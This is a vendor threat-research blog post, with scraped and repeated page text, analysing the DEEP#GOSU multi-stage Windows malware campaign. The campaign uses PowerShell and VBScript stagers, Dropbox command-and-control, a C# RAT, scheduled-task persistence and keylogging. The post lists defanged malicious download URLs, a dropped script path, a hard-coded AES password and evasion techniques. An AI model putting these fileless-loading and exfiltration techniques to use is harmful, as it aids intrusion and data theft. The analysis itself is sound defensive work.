“MethodInfo” object, which represents a specific method of a class. The “$instance” variable contains the instance of the class which in turn contains the method you want to invoke. The string is encoded in Base64 and then passed as an argument to the method. Since at this point the code is doing two pretty interesting things simultaneously, let’s follow the loading and execution of “r_enc.bin” from Dropbox further down (Stage 4) which is loaded from the following Dropbox URL: hxxps://content.dropboxapi[.]com/2/files/download/step2/r_enc.bin We’ll continue with the invocation of the new Base64 encoded method (Stage 4) further down. When analyzing the PowerShell script in Stage 2 we determined that the script once again reached back out to Dropbox and downloaded a compressed Base64 string. The file itself is indeed a binary file which can be easily confirmed using a tool such as CyberChef. If we place the large Base64 string (r_enc.bin) inside the input field, select “From Base64” and “Gunzip”, we see the MZ header and other common strings for Windows executables inside the output.  Figure 8: Decoding r_enc.bin in CyberChef The decompressed binary file ends up being an open source RAT (remote access trojan), known as TruRat, TutRat or C# R.A.T. which generates a commonly named client called TutClient.exe. As the name suggests, the RAT is coded in C# and is open source. Since the source of the application can be found online, we won’t go too deep into the binary code analysis portion as it’savailable online, but rather discuss its capabilities.  Figure 9: C# RAT executable client overview Currently this particular RAT software is quite old and likely to be picked up by most antivirus vendors. However, given the unique method in which this binary is loaded and executed directly into memory (stage2), it’s likely to skirt some detections. Execution of the payload in memory, also known as “fileless” execution, is a technique used by attackers to evade detection by traditional file-based antivirus solutions. Since the payload does not touch the disk, it leaves fewer traces, making it harder for security tools to detect and mitigate the threat. According to the C# Rat’s GitHub page, the malware supports a wide range of features including: Interestingly enough, this is not the first time that we’ve seen this RAT used against Korean targets. A year ago theKimsuky group wasidentifieddelivering TutRAT and xRAT payloads through other methods. Circling back to Stage 2, if you recall, we observed a large Base64 encoded string getting invoked. After decoding the string we reveal a VBScript code segment which once again is designed to connect back to Dropbox by interacting with specific web APIs.  Figure 10: Stage 4 VBScript execution – download info_sc.txt from Dropbox (from stage 2) The next stage is downloaded from Dropbox in the same manner we observed during the last several stages. Using a unique client ID, refresh token and secret, the file “info_sc.txt” is downloaded from the URL: hxxps://content.dropboxapi[.]com/2/files/download/step2/info_sc.txt Once the file is downloaded, it is written to a VB Stream object then switches the stream’s type to text and reads it as a UTF-8 encoded string. This is a method to convert binary data (the downloaded file content) into a readable string. The crucial part of this script is the “Execute” statement, which executes the string read from the stream as VBScript code. This means the downloaded content is not just data but executable code, which makes the purpose for Stage 4 run arbitrary VBScript code fetched from Dropbox.  Figure 11: Stage 4 VBScript execution execute downloaded code With the code downloaded from Dropbox, parsed and then converted, it’s placed inside “convertedString” and then executed. Lastly, the script dynamically writes a PowerShell file on the disk and then executes it (Stage 7). This file was written to: c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps1 Originally the script dropped the file namedw568232.ps12x, however it was immediately renamed tow568232.ps1using the following command: cmd /c rename c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps12x w568232.ps1 If you thought at this point we were done with Dropbox stages, you might be right, depending on the OS version the victim system is running. But for now, a closer look at this script reveals several indications of more traditional malware such as persistence indicators and WMI (Windows Management Instrumentation) activity. The script is quite complex, though it did not feature any form of obfuscation which needed to be decoded. Let’s go over some of the more interesting routines and functions to better understand its capabilities. At the beginning of the script there is a WMProc Subroutine which uses WMI to execute commands on the system. It takes a single parameterp_cmdwhich specifies the executable or script that is launched by the WMI service. Additionally, there is a commented out line with instructions to download, save and execute a remote .hwp document file. Kimsukyhas been known to use disguised hwp files in the past, so this could be an artifact of an older attack chain. The commented out line references a remote server at regard.co[.]kr, however we did not observe any network communication to that domain throughout the course of the DEEP#GOSU campaign.  Figure 12: Stage 5 VBScript execution – WMProc and TF functions TheTFfunction works with theRegandReg1subroutines which are used to schedule tasks on the system. Additionally, theTFfunction formats a timestamp for scheduling, and the Reg subroutine actually schedules a new task. This task is configured to execute a script or command at a later time, ensuring that the malware maintains persistence on the system.  Figure 13: Stage 5 VBScript execution – Reg and Reg1 functions At this point the script checks the version of the operating system and branches its behavior accordingly. For OS versions prior to Windows 10, it uses Internet Explorer functionality to download and execute a script fetched from a remote server at hxxp://gbionet[.]com/inc/basl/up1/list.php?query=6 After contacting the URL above, the script captures the “innerText” of the page’s body, which is the text content of the response from the server, excluding any HTML tags. For systems running Windows 10 or later, it uses a PowerShell script which is saved into a single VBScript variable to download and execute a payload from Dropbox using similar methods we witnessed prior.  Figure 14: Stage 5 VBScript execution – Next stage download The inclusion of Google Docs URLs in the PowerShell script encapsulated within thepsTxtvariable is a method used to dynamically retrieve configuration data for the Dropbox connection. This could be useful for when payloads, or Dropbox account data needs to be changed, without having to change the script itself. As we witnessed previously, the PowerShell script uses a hard-coded password (pa55w0rd), and then executes the decrypted content. This also helps reduce the malware’s detection footprint. Using these types of services to fetch configuration data or payloads can blend in with legitimate network traffic, reducing the likelihood of network-based detection.  Figure 15: Stage 5 VBScript/PowerShell execution – invoke next stage The decrypted content uses a predefined password and AES decryption. Since the downloaded content is encrypted another layer of protection against detection is added. Interestingly enough, the$uhvariable is not defined anywhere in the script. This is used by the Invoke-Command alias (icm) to execute a PowerShell scriptblock. This could be a mistake by the malware authors, or used in context with other more broad malware operations where it could be used with portions of code not included in the samples identified by the team. Lastly, the decrypted content is then executed directly in memory using a PowerShell invoke-expression, which leads us into Stage 6! Circling back to PowerShell, the next script that gets executed is an interesting script which attempts to enumerate the victim system as much as it can. Once again, Dropbox is used, however rather than downloading the next-stage payload, it issues a carefully-crafted POST request to submit its enumeration findings. As you can see in the data below, it formats the data into sections with headers containing plus signs on either side of the header text.  Figure 16: Stage 6 PowerShell system enumeration example The script enumerates the following items: Once the information is gathered it encrypts the data using AES functions similar to that of the AES decrypt functions we discussed earlier. The script then constructs an HTTP POST request to upload encrypted data. The script attempts to refresh an OAuth token for Dropbox using a client ID, secret, and refresh token, then uses this token to authorize an upload to Dropbox.  Figure 17: Stage 6 PowerShell upload enumeration data If you recall, this script is created and saved to the disk from Stage 5 (\appdata\roaming\microsoft\windows\w568232.ps1). The purpose of this script appears to be designed to serve as a tool for periodic communication with a command and control (C2) server via Dropbox. Its main purposes include encrypting and exfiltrating or downloading data. Most of the script once again contains PowerShell code for handling Dropbox connections and AES encryption/decryptors however there are a few interesting functions worth mentioning.  Figure 18: stage 7 various functions inside w568232.ps1 To ensure persistent, stealthy operation, it contains unique functions for both mutex-based singleton execution ($bMute) and variable intervals for network connectivity (GetTimeInterval). The time is set to a random interval between 10000 seconds (2.78 hours). Essentially, the script acts as a versatile backdoor that allows attackers to continuously monitor and control their infected systems. The purpose of this (and final) script is to act as a keylogging and clipboard monitoring component to monitor and log user activity on the compromised system. It achieves this by first obtaining access to Windows native APIs using .NET assemblies, and then using the Add-Type PowerShell module to call the Core class within the session. The script uses some targeted variable substitution obfuscation throughout the defined strings.  Figure 19: stage 8 obfuscated .NET assemblies The script uses functions such asGetAsyncKeyStateto monitor the state of individual keys on the keyboard, capturing key presses and releases.  Figure 20: stage 8 PowerShell keylogging functions The PowerShell script includes functionality to monitor and log changes in the clipboard content. It does this by using theGetClipboardSequenceNumberfunction to retrieve the current clipboard sequence number, which changes anytime the content of the clipboard changes. It then compares the current clipboard sequence number in$curClipwith the previously stored sequence number in$oldClip. If they differ, it indicates the clipboard content has changed. If the format is verified as “text” it then uses[Windows.Clipboard]::GetText()to retrieve the new clipboard text. Lastly, it appends the content into the$Path(Version.xml) variable using[System.IO.File]::AppendAllText.  Figure 21: stage 8 PowerShell clipboard monitoring The malware payloads used in the DEEP#GOSU represent a sophisticated, multi-stage threat designed to operate stealthily on Windows systems especially from a network-monitoring standpoint. It relied on both PowerShell and VBScript for its execution which interestingly enough used very minimal obfuscation. Each stage was encrypted using AES and a common password and IV which should minimize network, or flat file scanning detections. Its capabilities included keylogging, clipboard monitoring, dynamic payload execution, and data exfiltration, and persistence using both RAT software for full remote access, scheduled tasks as well as self-executing PowerShell scripts using jobs. Since many malware infections begin outside the organization, exercise caution especially around unsolicited emails, especially when the email is unexpected or employs a sense of urgency. When it comes to prevention and detection, the Securonix Threat Research Team recommends:    https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-301a Securonix 2024. All Rights ReservedLegal Center|Privacy Policy",Blog Contact Us Request a Demo Why Securonix? Why Securonix? Why Securonix? Threat Labs Analyst Resources Compare Us Learn More Products Products Overview Overview Platform 'Bring Your Own' Deployment Models 'Bring Your Own' Deployment Models Bring Your Own Snowflake Bring Your Own AWS Products Products Securonix EON Unified Defense SIEM UEBA SOAR ATS Investigate Solutions Solutions Monitoring the Cloud Monitoring the Cloud Cloud Security Monitoring Amazon Web Services Google Cloud Platform Microsoft Azure Microsoft 365 Featured Use Case Featured Use Case Insider Threat NDR EMR Monitoring MITRE ATT&CK Industries Industries Financial Services Healthcare Resources Resources Resource Library Case Studies Resources by Topic SIEM UEBA Cloud Security Insider Threat Information Security Security Analytics Learn More Partners Partners Partner Overview Solution Providers MSSPs System Integrators Technology Partners Partner Portal Login Company Company About Leadership Newsroom Press Careers Events Awards Blog Search Why Securonix? Why Securonix? Why Securonix? Threat Labs Analyst Resources Compare Us Learn More Products Products Overview Overview Platform 'Bring Your Own' Deployment Models 'Bring Your Own' Deployment Models Bring Your Own Snowflake Bring Your Own AWS Products Products Securonix EON Unified Defense SIEM UEBA SOAR ATS Investigate Solutions Solutions Monitoring the Cloud Monitoring the Cloud Cloud Security Monitoring Amazon Web Services Google Cloud Platform Microsoft Azure Microsoft 365 Featured Use Case Featured Use Case Insider Threat NDR EMR Monitoring MITRE ATT&CK Industries Industries Financial Services Healthcare Resources Resources Resource Library Case Studies Resources by Topic SIEM UEBA Cloud Security Insider Threat Information Security Security Analytics Learn More Partners Partners Partner Overview Solution Providers MSSPs System Integrators Technology Partners Partner Portal Login Company Company About Leadership Newsroom Press Careers Events Awards Blog Blog Contact Us Request a Demo Linkedin Twitter Youtube Blog 03/18/2024 Threat Research Share $len1 $len2 hxxps://content.dropboxapi[.]com/2/files/download/step2/ps.bin $newString Load GzExtract System.Drawing System.Windows.Forms PresentationCore makeProbe1 MethodInfo $instance hxxps://content.dropboxapi[.]com/2/files/download/step2/r_enc.bin hxxps://content.dropboxapi[.]com/2/files/download/step2/info_sc.txt Execute convertedString c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps1 w568232.ps12x w568232.ps1 cmd /c rename c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps12x w568232.ps1 p_cmd TF Reg Reg1 TF hxxp://gbionet[.]com/inc/basl/up1/list.php?query=6 psTxt $uh \appdata\roaming\microsoft\windows\w568232.ps1 $bMute GetTimeInterval GetAsyncKeyState GetClipboardSequenceNumber $curClip $oldClip [Windows.Clipboard]::GetText() $Path [System.IO.File]::AppendAllText GetForegroundWindow GetWindowText GetTickCount $Path $env:appdata\Microsoft\Windows\Themes\version.xml Previous Article Next Article Linkedin Twitter Youtube Contact Us Why Securonix Why Securonix Threat Labs Analyst Resources Compare Us Products Products Platform Bring Your Own Snowflake Bring Your Own AWS Securonix EON Unified Defense SIEM UEBA SOAR ATS Investigate Solutions Solutions Cloud Security Monitoring Amazon Web Services Google Cloud Platform Microsoft Azure Microsoft 365 Insider Threat NDR EMR Monitoring MITRE ATT&CK Financial Services Healthcare Resources Resources Resources Resources Resource Library Legal Center Open Source Software Listing – 5.0 Open Source Software Listing – 6.0 Company Company About Leadership Newsroom Press Careers Awards Events Services Services Training Support Services Professional Services Partners Solution Providers MSSPs System Integrators Technology Partners Partner Portal Login,"Securonix Threat Research Security Advisory: Analysis of New DEEP#GOSU Attack Campaign Likely Associated with North Korean Kimsuky Targeting Victims with Stealthy Malware - SecuronixBlogContact UsRequest a DemoWhy Securonix?Why Securonix?Threat LabsAnalyst ResourcesCompare UsSecuronix EON: A New Era of AI–Reinforced CyberOpsLearn MoreProductsOverviewPlatform'Bring Your Own' Deployment ModelsBring Your Own SnowflakeBring Your Own AWSProductsSecuronix EONUnified Defense SIEMUEBASOARATSInvestigateSolutionsMonitoring the CloudCloud Security MonitoringGain visibility to detect and respond to cloud threats.Amazon Web ServicesAchieve faster response to threats across AWS.Google Cloud PlatformImprove detection and response across GCP.Microsoft AzureExpand security monitoring across Azure services.Microsoft 365Benefit from detection and response on Office 365.Featured Use CaseInsider ThreatMonitor and mitigate malicious and negligent users.NDRAnalyze network events to detect and respond to advanced threats.EMR MonitoringIncrease patient data privacy and prevent data snooping.MITRE ATT&CKAlign alerts and analytics to the MITRE ATT&CK framework.IndustriesFinancial ServicesHealthcareResourcesResource LibraryCase StudiesResources by TopicSIEMUEBACloud SecurityInsider ThreatInformation SecuritySecurity AnalyticsSecuronix EON: A New Era of AI–Reinforced CyberOpsLearn MorePartnersPartner OverviewSolution ProvidersMSSPsSystem IntegratorsTechnology PartnersPartner Portal LoginCompanyAboutLeadershipNewsroomPressCareersEventsAwardsBlogSearchWhy Securonix?Why Securonix?Threat LabsAnalyst ResourcesCompare UsSecuronix EON: A New Era of AI–Reinforced CyberOpsLearn MoreProductsOverviewPlatform'Bring Your Own' Deployment ModelsBring Your Own SnowflakeBring Your Own AWSProductsSecuronix EONUnified Defense SIEMUEBASOARATSInvestigateSolutionsMonitoring the CloudCloud Security MonitoringGain visibility to detect and respond to cloud threats.Amazon Web ServicesAchieve faster response to threats across AWS.Google Cloud PlatformImprove detection and response across GCP.Microsoft AzureExpand security monitoring across Azure services.Microsoft 365Benefit from detection and response on Office 365.Featured Use CaseInsider ThreatMonitor and mitigate malicious and negligent users.NDRAnalyze network events to detect and respond to advanced threats.EMR MonitoringIncrease patient data privacy and prevent data snooping.MITRE ATT&CKAlign alerts and analytics to the MITRE ATT&CK framework.IndustriesFinancial ServicesHealthcareResourcesResource LibraryCase StudiesResources by TopicSIEMUEBACloud SecurityInsider ThreatInformation SecuritySecurity AnalyticsSecuronix EON: A New Era of AI–Reinforced CyberOpsLearn MorePartnersPartner OverviewSolution ProvidersMSSPsSystem IntegratorsTechnology PartnersPartner Portal LoginCompanyAboutLeadershipNewsroomPressCareersEventsAwardsBlogBlogContact UsRequest a DemoLinkedinTwitterYoutubeBlogSecuronix Threat Research Security Advisory: Analysis of New DEEP#GOSU Attack Campaign Likely Associated with North Korean Kimsuky Targeting Victims with Stealthy Malware03/18/2024Threat ResearchShareBy Securonix Threat Research: D. Iuzvyk, T. Peck, O. Kolesnikovtldr:The Securonix Threat Research team has uncovered an elaborate multi-stage attack campaign likely associated with the North KoreanKimsukygroup.The Securonix Threat Research (STR) team has been monitoring a new campaign tracked as DEEP#GOSU likely associated with the Kimsuky group, which features some new code/stagers as well as some recycled code and TTPs that werereported in the past. While the targeting of South Korean victims by the Kimsuky grouphappened before, from the tradecraft observed it’s apparent that the group has shifted to using a new script-based attack chain that leverages multiple PowerShell and VBScript stagers to quietly infect systems. The later-stage scripts allow the attackers to monitor clipboard, keystroke, and other session activity.The threat actors also employed a remote access trojan (RAT) software to allow for full control over the infected hosts, while the background scripts continued to provide persistence and monitoring capabilities.All of the C2 communication is handled through legitimate services such as Dropbox or Google Docs allowing the malware to blend undetected into regular network traffic. Since these payloads were pulled from remote sources like Dropbox, it allowed the malware maintainers to dynamically update its functionalities or deploy additional modules without direct interaction with the system .The malware used in the DEEP#GOSU campaign likely enters the system through typical means where the user downloads a malicious email attachment containing a zip file with a single disguised file using the extension: pdf.lnk, (IMG_20240214_0001.pdf.lnk) in this case.Stage 1: Initial execution: LNK files [T1204.002]The use of shortcut files, or .lnk files by threat actors is nothing new. However, in the case of DEEP#GOSU, the methodology behind the code execution is quite different from what we have typically seen in the past.First, as seen in the figure below, the length of the command is quite impressive and it’s clear that the executed PowerShell is designed to perform several complex functions. Additionally, standing at about 2.2MB, it’s clear that there is more to this shortcut file than what meets the eye.Figure 1: IMG_20240214_0001.pdf.lnk – command line executionThe embedded PowerShell script contained within the shortcut file is designed to take byte data from itself, which extracts embedded files, AESDecrypt and executes further malicious code downloaded from the internet (/step2/ps.bin) and clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates some level of sophistication intended to evade detection and analysis. This type of infrastructure typically takes much more time to set up and maintain versus simply hosting files on rented servers.Let’s first analyze the reason that the shortcut file is over 2MB in size. Upon close analysis, the shortcut file appears to have an entire embedded PDF concatenated to it after tens of thousands of “A” characters. Those characters may be an attempt to pad the size of the file to evade AV detections.The figure below demonstrates how this looks when using a hexadecimal editor to view the file’s raw data. On the left, we can see the end of the shortcut code which calls cmd.exe (to eventually call powershell.exe) and the start of the sequence of “A” characters. Over on the left the A’s terminate and the start of a PDF header appears!Figure 2: Hex bytes of IMG_20240214_0001.pdf.lnk highlighting the embedded PDF fileSo, the shortcut file has a concatenated PDF file attached to it. The PowerShell code contains a clever function that performs a few tasks. The PowerShell code below is taken from the code from within the shortcut file (figure 1) and then cleaned up a bit so it’s easier to read:Figure 3: IMG_20240214_0001.pdf.lnk – extract PDF portion from itselfThis portion of the script extracts the PDF portion of the .lnk file’s content based on specific byte positions which exists between byte values 2105824 and 2282653 ($len1to$len2).The script writes out the progress at each operational task such as “readfileend”, “exestart” and “exeend”.The alias “sc” is used to instantiate a new object to hold the PDF file.This extracted content is then eventually saved to a new variable $path, and then executed using the PowerShell Start-Process commandlet.The PDF content is then executed which will then open in the system’s default PDF viewer which opens as “IMG_20240214_0001.pdf”.All files are then deleted.What makes this tactic clever is that there is technically no PDF file contained within the initial zip file sent to the victim. When the user clicks the PDF lure (shortcut file) they’re immediately presented with a PDF file thus removing any concern that anything unexpected happened.The PDF lure document is in Korean and appears to be an announcement regarding the son of Korean Airlines CEO Choi Hyun (the late Choi Yul) and states that the son has passed away due to a car accident. The rest contains details and dates of the funeral hall.Figure 4: IMG_20240214_0001.pdf lure documentIn addition to extracting and executing the PDF document, the shortcut file also executes the malware’s next stage payload from a Dropbox URL (hxxps://content.dropboxapi[.]com/2/files/download/step2/ps.bin). Despite its name, the ps.bin file is actually another PowerShell script which we’ll dive into later.Since Dropbox requires authentication, all of the required parameters are embedded into the shortcut’s original PowerShell script (figure 1). With the PowerShell code cleaned up, the portion of the script responsible for downloading and executing the next-stage payload ($newString) is highlighted below.Figure 5: IMG_20240214_0001.lnk – download and invoke next-stage payload from DropboxTo sum up, the PowerShell script contained with the shortcut file is designed to silently find and execute the specifically crafted malicious .lnk file (itself), extract and execute the embedded PDF lure document, authenticate, decrypt and execute further malicious code downloaded from Dropbox, and then clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates a level of sophistication intended to evade detection and analysis.Stage 2: Invoked code from Dropbox [T1102]At this stage, the initial shortcut file has downloaded and invoked a remote payload from Dropbox called ps3.bin. The PowerShell code contained within the .bin file defines a function (Load) that performs several operations which includes downloading, decompressing, and dynamically loading and executing .NET assembly code from a different Dropbox URL.Define a decompression helper function (GzExtract):This inner function takes a byte array as input in the form of GZIP compressed data.Decompresses this data and return the resulting byte arrayDynamically loading .NET assemblies:The script dynamically loads assemblies related toSystem.Drawing,System.Windows.Forms, andPresentationCoreThis enables the script to use advanced graphical UI capabilities which have been used in the past for features such as screenshots or screen recording byDark Pink malwareamong others.Authenticating with Dropbox and downloading next-stage remote payload:Similar to the shortcut file’s PowerShell script, it authenticates with Dropbox once again using a refresh token, client ID, and client secret to obtain an access token.A file named r_enc.bin is downloaded from Dropbox (stage 3).After downloading the file, it attempts to decompress the payload using the GzExtract function defined earlier.The script implies this payload is a .NET assembly in binary form, though compressed to evade detection.Dynamically loading and executing the .NET assembly:It loads the decompressed .NET assembly into memory without writing it to disk which can help cut down AV detections.It iterates through types and methods within the loaded assembly to find and invoke a specific method (makeProbe1). The invocation is commented out, but it suggests that the method would execute with a hardcoded parameter, which is partially shown and then truncated.This dynamic loading and execution allow the malware to perform virtually any action the .NET framework supports, based on the code within the downloaded assembly.Figure 6: Example of PowerShell ps.binIn addition to the above the script also invokes a method on an object instance using reflection in PowerShell, with a parameter that appears to be a Base64-encoded string. The string can be seen in the figure below.Figure 7: ps.bin PowerShell invokes next stage payloadsThe $method variable is set up and holds a reference to a “MethodInfo” object, which represents a specific method of a class. The “$instance” variable contains the instance of the class which in turn contains the method you want to invoke. The string is encoded in Base64 and then passed as an argument to the method.Since at this point the code is doing two pretty interesting things simultaneously, let’s follow the loading and execution of “r_enc.bin” from Dropbox further down (Stage 4) which is loaded from the following Dropbox URL:hxxps://content.dropboxapi[.]com/2/files/download/step2/r_enc.binWe’ll continue with the invocation of the new Base64 encoded method (Stage 4) further down.Stage 3: TutClient [C# RAT] (r_enc.bin)When analyzing the PowerShell script in Stage 2 we determined that the script once again reached back out to Dropbox and downloaded a compressed Base64 string. The file itself is indeed a binary file which can be easily confirmed using a tool such as CyberChef. If we place the large Base64 string (r_enc.bin) inside the input field, select “From Base64” and “Gunzip”, we see the MZ header and other common strings for Windows executables inside the output.Figure 8: Decoding r_enc.bin in CyberChefThe decompressed binary file ends up being an open source RAT (remote access trojan), known as TruRat, TutRat or C# R.A.T. which generates a commonly named client called TutClient.exe.As the name suggests, the RAT is coded in C# and is open source. Since the source of the application can be found online, we won’t go too deep into the binary code analysis portion as it’savailable online, but rather discuss its capabilities.Figure 9: C# RAT executable client overviewCurrently this particular RAT software is quite old and likely to be picked up by most antivirus vendors. However, given the unique method in which this binary is loaded and executed directly into memory (stage2), it’s likely to skirt some detections.Execution of the payload in memory, also known as “fileless” execution, is a technique used by attackers to evade detection by traditional file-based antivirus solutions. Since the payload does not touch the disk, it leaves fewer traces, making it harder for security tools to detect and mitigate the threat.According to the C# Rat’s GitHub page, the malware supports a wide range of features including:KeyloggerRemote desktopMic and cam spyRemote Cmd promptProcess and file managerFun menu (hiding desktop icons, clock, taskbar, showing messagebox, triggering Windows sound effects)DDoS with target validationPassword manager (supporting: Internet Explorer, Google Chrome, Firefox)Interestingly enough, this is not the first time that we’ve seen this RAT used against Korean targets. A year ago theKimsuky group wasidentifieddelivering TutRAT and xRAT payloads through other methods.Stage 4: VBScript execution (invoked code from stage 2) [T1059.005]Circling back to Stage 2, if you recall, we observed a large Base64 encoded string getting invoked. After decoding the string we reveal a VBScript code segment which once again is designed to connect back to Dropbox by interacting with specific web APIs.Figure 10: Stage 4 VBScript execution – download info_sc.txt from Dropbox (from stage 2)The next stage is downloaded from Dropbox in the same manner we observed during the last several stages. Using a unique client ID, refresh token and secret, the file “info_sc.txt” is downloaded from the URL:hxxps://content.dropboxapi[.]com/2/files/download/step2/info_sc.txtOnce the file is downloaded, it is written to a VB Stream object then switches the stream’s type to text and reads it as a UTF-8 encoded string. This is a method to convert binary data (the downloaded file content) into a readable string.The crucial part of this script is the “Execute” statement, which executes the string read from the stream as VBScript code. This means the downloaded content is not just data but executable code, which makes the purpose for Stage 4 run arbitrary VBScript code fetched from Dropbox.Figure 11: Stage 4 VBScript execution execute downloaded codeWith the code downloaded from Dropbox, parsed and then converted, it’s placed inside “convertedString” and then executed.Lastly, the script dynamically writes a PowerShell file on the disk and then executes it (Stage 7). This file was written to:c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps1Originally the script dropped the file namedw568232.ps12x, however it was immediately renamed tow568232.ps1using the following command:cmd /c rename c:\users\[redacted]\appdata\roaming\microsoft\windows\w568232.ps12x w568232.ps1Stage 5: VBScript execution (info_sc.txt) [T1059.005]If you thought at this point we were done with Dropbox stages, you might be right, depending on the OS version the victim system is running. But for now, a closer look at this script reveals several indications of more traditional malware such as persistence indicators and WMI (Windows Management Instrumentation) activity.The script is quite complex, though it did not feature any form of obfuscation which needed to be decoded. Let’s go over some of the more interesting routines and functions to better understand its capabilities.WMI Execution [T1047]At the beginning of the script there is a WMProc Subroutine which uses WMI to execute commands on the system. It takes a single parameterp_cmdwhich specifies the executable or script that is launched by the WMI service.Additionally, there is a commented out line with instructions to download, save and execute a remote .hwp document file. Kimsukyhas been known to use disguised hwp files in the past, so this could be an artifact of an older attack chain. The commented out line references a remote server at regard.co[.]kr, however we did not observe any network communication to that domain throughout the course of the DEEP#GOSU campaign.Figure 12: Stage 5 VBScript execution – WMProc and TF functionsScheduled tasks [T1053]TheTFfunction works with theRegandReg1subroutines which are used to schedule tasks on the system. Additionally, theTFfunction formats a timestamp for scheduling, and the Reg subroutine actually schedules a new task. This task is configured to execute a script or command at a later time, ensuring that the malware maintains persistence on the system.Figure 13: Stage 5 VBScript execution – Reg and Reg1 functionsRemote payload downloadAt this point the script checks the version of the operating system and branches its behavior accordingly. For OS versions prior to Windows 10, it uses Internet Explorer functionality to download and execute a script fetched from a remote server athxxp://gbionet[.]com/inc/basl/up1/list.php?query=6After contacting the URL above, the script captures the “innerText” of the page’s body, which is the text content of the response from the server, excluding any HTML tags.For systems running Windows 10 or later, it uses a PowerShell script which is saved into a single VBScript variable to download and execute a payload from Dropbox using similar methods we witnessed prior.Figure 14: Stage 5 VBScript execution – Next stage downloadThe inclusion of Google Docs URLs in the PowerShell script encapsulated within thepsTxtvariable is a method used to dynamically retrieve configuration data for the Dropbox connection. This could be useful for when payloads, or Dropbox account data needs to be changed, without having to change the script itself.As we witnessed previously, the PowerShell script uses a hard-coded password (pa55w0rd), and then executes the decrypted content. This also helps reduce the malware’s detection footprint. Using these types of services to fetch configuration data or payloads can blend in with legitimate network traffic, reducing the likelihood of network-based detection.Figure 15: Stage 5 VBScript/PowerShell execution – invoke next stageThe decrypted content uses a predefined password and AES decryption. Since the downloaded content is encrypted another layer of protection against detection is added.Interestingly enough, the$uhvariable is not defined anywhere in the script. This is used by the Invoke-Command alias (icm) to execute a PowerShell scriptblock. This could be a mistake by the malware authors, or used in context with other more broad malware operations where it could be used with portions of code not included in the samples identified by the team.Lastly, the decrypted content is then executed directly in memory using a PowerShell invoke-expression, which leads us into Stage 6!Stage 6: PowerShell execution – system enumeration [T1082]Circling back to PowerShell, the next script that gets executed is an interesting script which attempts to enumerate the victim system as much as it can. Once again, Dropbox is used, however rather than downloading the next-stage payload, it issues a carefully-crafted POST request to submit its enumeration findings.As you can see in the data below, it formats the data into sections with headers containing plus signs on either side of the header text.Figure 16: Stage 6 PowerShell system enumeration exampleThe script enumerates the following items:Running processes (tasklist)Firewall status for all profiles (Netsh Advfirewall show allprofiles)Registered antivirus products via Security Center (AntiVirusProduct class from ROOT\SecurityCenter and ROOT\SecurityCenter2 namespaces)User profile directories:Desktop ($user_dir\Desktop)Documents ($user_dir\Documents)Downloads ($user_dir\Downloads)Application data and start menu programs:Recent documents ($appdata\Microsoft\Windows\Recent)Start Menu Programs ($appdata\Microsoft\Windows\Start Menu\Programs)Program files directories:Default Program Files ($env:ProgramFiles)Program Files (x86) for 64-bit systems ($env:ProgramFiles(x86))All drives and their content, including:Drive label, type, formatDirectories and files within each accessible driveOnce the information is gathered it encrypts the data using AES functions similar to that of the AES decrypt functions we discussed earlier. The script then constructs an HTTP POST request to upload encrypted data. The script attempts to refresh an OAuth token for Dropbox using a client ID, secret, and refresh token, then uses this token to authorize an upload to Dropbox.Figure 17: Stage 6 PowerShell upload enumeration dataStage 7: stealth and persistence in PowerShell [T1041]If you recall, this script is created and saved to the disk from Stage 5 (\appdata\roaming\microsoft\windows\w568232.ps1). The purpose of this script appears to be designed to serve as a tool for periodic communication with a command and control (C2) server via Dropbox. Its main purposes include encrypting and exfiltrating or downloading data.Most of the script once again contains PowerShell code for handling Dropbox connections and AES encryption/decryptors however there are a few interesting functions worth mentioning.Figure 18: stage 7 various functions inside w568232.ps1To ensure persistent, stealthy operation, it contains unique functions for both mutex-based singleton execution ($bMute) and variable intervals for network connectivity (GetTimeInterval). The time is set to a random interval between 10000 seconds (2.78 hours). Essentially, the script acts as a versatile backdoor that allows attackers to continuously monitor and control their infected systems.Stage 8: Keylogging [T1056.001]The purpose of this (and final) script is to act as a keylogging and clipboard monitoring component to monitor and log user activity on the compromised system.It achieves this by first obtaining access to Windows native APIs using .NET assemblies, and then using the Add-Type PowerShell module to call the Core class within the session. The script uses some targeted variable substitution obfuscation throughout the defined strings.Figure 19: stage 8 obfuscated .NET assembliesThe script uses functions such asGetAsyncKeyStateto monitor the state of individual keys on the keyboard, capturing key presses and releases.Figure 20: stage 8 PowerShell keylogging functionsThe PowerShell script includes functionality to monitor and log changes in the clipboard content. It does this by using theGetClipboardSequenceNumberfunction to retrieve the current clipboard sequence number, which changes anytime the content of the clipboard changes.It then compares the current clipboard sequence number in$curClipwith the previously stored sequence number in$oldClip. If they differ, it indicates the clipboard content has changed. If the format is verified as “text” it then uses[Windows.Clipboard]::GetText()to retrieve the new clipboard text.Lastly, it appends the content into the$Path(Version.xml) variable using[System.IO.File]::AppendAllText.Figure 21: stage 8 PowerShell clipboard monitoringAdditional functionality:Window monitoring:It uses bothGetForegroundWindowandGetWindowTextto track the active window and its title, enabling the script to log which application the user is interacting with alongside the captured keystrokes or clipboard.System tick count:GetTickCountis also used to manage the timing of log entries (clipboard, keystrokes, etc), ensuring that entries are spaced out and potentially reducing the volume of logged data to focus on periods of activity.Encoding and file writing:All of the captured data is saved into the variable path$Path(“$env:appdata\Microsoft\Windows\Themes\version.xml“), using UTF-8 encoding (created and exfiltrated in stage 7.)Wrapping up…The malware payloads used in the DEEP#GOSU represent a sophisticated, multi-stage threat designed to operate stealthily on Windows systems especially from a network-monitoring standpoint. It relied on both PowerShell and VBScript for its execution which interestingly enough used very minimal obfuscation. Each stage was encrypted using AES and a common password and IV which should minimize network, or flat file scanning detections.Its capabilities included keylogging, clipboard monitoring, dynamic payload execution, and data exfiltration, and persistence using both RAT software for full remote access, scheduled tasks as well as self-executing PowerShell scripts using jobs.Securonix recommendationsSince many malware infections begin outside the organization, exercise caution especially around unsolicited emails, especially when the email is unexpected or employs a sense of urgency. When it comes to prevention and detection, the Securonix Threat Research Team recommends:Avoid downloading files or attachments from external sources, especially if the source was unsolicited.Monitor common malware staging directories, especially script-related activity in world-writable directories. In the case of this campaign the threat actors staged in subdirectories in %APPDATA%Since all of the network communication in the 